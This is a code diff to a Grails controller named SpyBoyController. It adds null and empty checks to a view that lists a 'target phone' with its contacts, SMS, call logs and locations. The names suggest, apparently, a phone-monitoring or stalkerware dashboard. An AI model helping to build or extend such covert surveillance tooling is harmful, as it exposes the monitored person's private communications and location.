@@ -291,7 +291,7 @@ class SpyBoyController {
 
 		TargetPhone currentTargetPhone = null;
 		
-		if(targetPhones!=null){
+		if(targetPhones!=null && !targetPhones.isEmpty()){
 
 
 			if(simSubscriberId!=null && !simSubscriberId.isEmpty()){
@@ -358,7 +358,7 @@ class SpyBoyController {
 				}
 			}
 		}
-		[currentTargetPhone:currentTargetPhone,activeSimSubscriberId:simSubscriberId,targetPhoneInstanceList:targetPhones,user:currentUser,scrollToID:scrollTo,contactInstanceList: contacts,contactInstanceTotal: contacts.size(),smsInstanceTotal: smss!=null ? smss.size():0,callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
+		[currentTargetPhone:currentTargetPhone,activeSimSubscriberId:simSubscriberId,targetPhoneInstanceList:targetPhones,user:currentUser,scrollToID:scrollTo,contactInstanceList: contacts,contactInstanceTotal: contacts!=null ? contacts.size():0,smsInstanceTotal: smss!=null ? smss.size():0,callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
 	}
 
 
